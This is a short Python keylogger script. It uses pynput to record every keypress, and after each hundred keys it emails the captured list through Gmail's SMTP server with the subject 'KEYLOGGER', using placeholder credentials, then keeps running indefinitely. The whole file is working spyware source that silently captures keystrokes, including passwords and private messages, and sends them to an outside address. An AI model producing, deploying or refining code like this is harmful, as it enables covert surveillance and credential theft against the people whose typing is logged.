from pynput.keyboard import Listener
from datetime import date
import smtplib
from email.message import EmailMessage

count=0
log_list = []

Date = date.today()
def listen():
    keylog = Listener(on_press=log)
    keylog.start()
def send_email(message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login('your.@gmail.com', 'password')
    email = EmailMessage()
    email['From'] = 'email'
    receiver = 'email'
    subject = 'KEYLOGGER'
    message = message
    email['To'] = receiver
    email['Subject'] = subject
    email.set_content(message)
    server.send_message(email)
    server.close()

def log(key):
    global log_list,count,Time,Date
    log_list.append(f'{key}')

    count+=1
    if count>=100:
        send_email(str(log_list))
        log_list.clear()
        count=0

if __name__ == '__main__':
    listen()
    while True:
        pass
